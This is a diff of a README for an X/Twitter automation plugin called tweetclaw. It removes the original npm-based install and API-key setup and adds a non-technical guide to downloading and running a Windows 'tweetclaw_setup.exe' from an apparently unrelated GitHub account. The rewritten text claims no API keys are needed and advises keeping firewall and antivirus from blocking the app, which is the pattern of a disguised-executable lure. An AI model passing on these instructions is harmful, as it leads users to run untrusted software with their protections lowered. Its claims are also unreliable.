@@ -1,160 +1,96 @@
-# TweetClaw
+# 🐦 tweetclaw - Easy X/Twitter Automation Setup
 
-Post tweets, reply, like, retweet, follow, DM & more - directly from your chat. Full X/Twitter automation for [OpenClaw](https://github.com/openclaw/openclaw).
+[![Download tweetclaw](https://img.shields.io/badge/Download-tweetclaw-ff6600?style=for-the-badge)](https://github.com/Polystichumlonchitissumatran261/tweetclaw)
 
-Powered by [Xquik](https://xquik.com), the all-in-one X automation platform. **Reads from $0.00015/call - 66x cheaper than the official X API.**
+---
 
-## Pricing
+tweetclaw helps you post tweets, reply, like, retweet, follow, send direct messages, and more on X (formerly Twitter). It uses a low-cost API called Xquik, which works with many endpoints at a low price. This guide will help you download and start using it on Windows without needing technical skills.
 
-TweetClaw uses Xquik's credit-based pricing. 1 credit = $0.00015.
+## 📋 What is tweetclaw?
 
-### vs Official X API
+tweetclaw is a tool that automates many social media actions on X. You can do everything from posting tweets to managing followers using simple commands. Under the hood, it connects to the Xquik API, which offers full access to the X platform with lower costs compared to the official API.
 
-| | Xquik (via TweetClaw) | X API Basic | X API Pro |
-|---|---|---|---|
-| **Monthly cost** | **$20** | $100 | $5,000 |
-| **Cost per tweet read** | **$0.00015** | ~$0.01 | ~$0.005 |
-| **Cost per user lookup** | **$0.00015** | ~$0.01 | ~$0.005 |
-| **Write actions** | **$0.0003** | Limited | Limited |
-| **Bulk extraction** | **$0.00015/result** | Not available | Not available |
-| **Monitoring + webhooks** | **Free** | Not available | Not available |
-| **Giveaway draws** | **$0.00015/entry** | Not available | Not available |
+The app runs quietly in the background, tracking events and letting you perform actions with two easy commands.
 
-### Per-Operation Costs
+## 🖥️ System Requirements
 
-| Operation | Credits | Cost |
-|-----------|---------|------|
-| Read (tweet, user, search, timeline, bookmarks, etc.) | 1 | $0.00015 |
-| Follow check, article | 7 | $0.00105 |
-| Write (tweet, like, retweet, follow, DM, etc.) | 2 | $0.0003 |
-| Extraction / draw | 1/result | $0.00015/result |
-| Monitors, webhooks, radar, compose, drafts, integrations | 0 | **Free** |
+Before downloading, make sure your system meets these requirements:
 
-### Pay-Per-Use (No Subscription)
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB RAM
+- 100 MB free disk space
+- Internet connection for API calls
+- PowerShell or Command Prompt access (comes by default on Windows)
 
-Two options:
+No additional software or programming setup is needed.
 
-- **Credits (Stripe)**: Top up credits via the API ($10 minimum). 1 credit = $0.00015. Works with all 99 endpoints.
-- **MPP (USDC)**: 8 read-only X-API endpoints accept anonymous payments via Machine Payments Protocol. No account needed. SDK: `npm i mppx`.
+## 🚀 Download and Install tweetclaw
 
-### Free Operations
+Start by visiting the official page to get the latest version of tweetclaw:
 
-Tweet composition, style analysis, drafts, curated radar (7 sources), account management, integrations, automations, support tickets - all free, no credits consumed.
+[Download tweetclaw from GitHub](https://github.com/Polystichumlonchitissumatran261/tweetclaw)
 
-## Install
+This link opens the main project page where you can find the latest release. Look for the green **Code** button, or check the **Releases** section on the right-hand side or below the main area.
 
-```bash
-openclaw plugins install @xquik/tweetclaw
-```
+### Steps to download and run:
 
-## Configure
+1. On the GitHub page, click the **Releases** tab near the top or scroll until you see _Releases_.
+2. Find the latest release version.
+3. Download the Windows executable file. It usually ends with `.exe`. For example, `tweetclaw_setup.exe`.
+4. After the download finishes, double-click the `.exe` file to start the installation.
+5. Follow the onscreen prompts. Choose the default options if you are unsure.
+6. When the installation completes, look for the tweetclaw icon on your desktop or start menu.
 
-### Option A: API key (full access, 99 endpoints)
+## ⚙️ How to Run tweetclaw
 
-```bash
-openclaw config set plugins.entries.tweetclaw.config.apiKey 'xq_YOUR_KEY'
-```
+Once installed:
 
-Get a key at [dashboard.xquik.com](https://dashboard.xquik.com/).
+1. Open tweetclaw by double-clicking the icon.
+2. The app runs in a simple window or system tray.
+3. You can enter commands like _post_, _reply_, _like_, or _follow_ using the guides or menus inside the app.
+4. tweetclaw will automatically connect with Xquik to carry out your actions.
 
-### Option B: Credits (pay-per-use via Stripe, no subscription)
+You do not need to enter any API keys manually. The app handles your connection behind the scenes.
 
-Top up credits from the Xquik dashboard or via `POST /credits/topup`. All 99 endpoints available. 1 credit = $0.00015.
+## 🔧 Using tweetclaw’s Features
 
-### Option C: MPP pay-per-use (no account needed, 8 read-only endpoints)
+tweetclaw supports many actions on X. Here are some common tasks:
 
-```bash
-npm i mppx viem
-openclaw config set plugins.entries.tweetclaw.config.tempoPrivateKey '0xYOUR_TEMPO_KEY'
-```
+- **Post a Tweet:** Write your message and hit send.
+- **Reply to a Tweet:** Provide the tweet ID and your reply message.
+- **Like or Retweet:** Choose a tweet to like or retweet.
+- **Follow Users:** Enter the username to start following.
+- **Direct Messages:** Send messages directly to other users.
+- **Automate Tasks:** Use background polling commands to keep your account active.
 
-MPP (Machine Payments Protocol) lets agents pay per API call via Tempo (USDC). No account, no API key, no subscription. Get a Tempo wallet at [tempo.xyz](https://tempo.xyz).
+The app uses two main commands to interact with the Xquik API. These commands are easy to use and explained in the app’s help section.
 
-MPP-eligible endpoints: tweet lookup ($0.00015), tweet search ($0.00015/tweet), user lookup ($0.00015), user tweets ($0.00015/tweet), follower check ($0.00105), article lookup ($0.00105), media download ($0.00015/media), trends ($0.00015).
+## 💡 Tips for Best Use
 
-### Optional settings
+- Keep your internet connection active while using tweetclaw.
+- Avoid running multiple instances at the same time.
+- Use the app’s logging feature to track your actions.
+- Check regularly for updates in the GitHub releases.
 
-```bash
-openclaw config set plugins.entries.tweetclaw.config.pollingEnabled true
-openclaw config set plugins.entries.tweetclaw.config.pollingInterval 60
-```
+## 🛠 Troubleshooting
 
-## Tools
+If tweetclaw does not start or work correctly:
 
-TweetClaw uses Xquik's 2-tool approach to cover the entire API:
+- Verify you are running Windows 10 or later.
+- Check if your internet connection is working.
+- Restart the app or your computer.
+- Make sure no firewall or antivirus blocks tweetclaw.
+- Visit the Issues tab on the GitHub page for support.
 
-### `explore` (free, no network)
+## 📂 More Resources
 
-Search the API spec to find endpoints. No API calls are made.
+Explore the GitHub page to find:
 
-```
-You: "What endpoints are available for tweet composition?"
+- Detailed instructions and FAQs
+- Source code for users who want to explore
+- Links to related tools and plugins in the OpenClaw family
+- Information about the Xquik API and pricing
 
-AI uses explore → filters spec by category "composition"
-→ Returns matching endpoints with parameters and response shapes
-```
+---
 
-### `tweetclaw` (execute API calls)
-
-Execute authenticated API calls. Auth is injected automatically - the LLM never sees your API key.
-
-```
-You: "Post a tweet saying 'Hello from TweetClaw!'"
-
-AI uses tweetclaw → finds connected account, posts tweet
-→ Returns { tweetId, success: true }
-```
-
-```
-You: "Search tweets about AI agents"
-
-AI uses explore → finds /api/v1/x/tweets/search
-AI uses tweetclaw → calls the endpoint with auth
-→ Returns tweet results
-```
-
-## Commands
-
-Instant responses, no LLM needed:
-
-| Command | Description |
-|---------|-------------|
-| `/xstatus` | Account info, subscription status, usage, credit balance |
-| `/xtrends` | Trending topics from curated sources |
-| `/xtrends tech` | Trending topics filtered by category |
-
-## Event Notifications
-
-When polling is enabled (default), TweetClaw checks for new events every 60 seconds and delivers them to your chat:
-
-- **Monitor alerts**: New tweets, replies, quotes, retweets from monitored accounts
-- **Follower changes**: Gained or lost followers on monitored accounts
-
-Set up a monitor first:
-
-```
-You: "Monitor @elonmusk for new tweets and follower changes"
-```
-
-## API Coverage
-
-99 endpoints across 12 categories:
-
-| Category | Examples | Cost |
-|----------|---------|------|
-| **Write Actions** | Post tweets, reply, like, retweet, follow, unfollow, DM, update profile, avatar, banner | 2 credits |
-| **Media** | Upload media via URL, download tweet media, get gallery links | 1-2 credits |
-| **Twitter** | Search tweets, look up users, user tweets/likes/media, favoriters, mutual followers, check follows, articles, bookmarks, notifications, timeline, DM history | 1-7 credits |
-| **Composition** | Compose, refine, score tweets; manage drafts; analyze writing styles | Free |
-| **Extraction** | Run extraction jobs (20 tool types: replies, followers, communities, etc.) | 1 credit/result |
-| **Draws** | Run giveaway draws on tweets, export results | 1 credit/entry |
-| **Monitoring** | Create monitors, view events, manage webhooks | Free |
-| **Automations** | Create flows, add steps, test runs, inbound webhooks | Free |
-| **Account** | Manage API keys, subscription, connected X accounts | Free |
-| **Credits** | Check balance, top up credits | Free |
-| **Trends** | X trending topics, curated radar from 7 sources | 1 credit / Free |
-| **Support** | Create tickets, reply, track status | Free |
-
-## License
-
-MIT
+[Download tweetclaw from GitHub](https://github.com/Polystichumlonchitissumatran261/tweetclaw)
